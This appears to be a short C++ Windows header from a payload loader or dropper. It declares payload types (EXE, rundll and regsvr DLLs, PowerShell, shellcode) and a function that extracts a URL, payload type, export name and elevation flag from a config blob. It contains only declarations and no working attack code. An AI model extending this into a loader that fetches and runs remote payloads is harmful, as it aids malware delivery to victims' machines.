#pragma once

#include <Windows.h>

namespace Config {
	enum PayloadType {
		kEXE,
		kDllRundll,
		kDllRegsvr,
		kPS,
		kSC
	};

	bool ExtractConfig(PBYTE config, LPWSTR* url, PDWORD payload_type, LPWSTR* export_function, bool* force_elevate);
}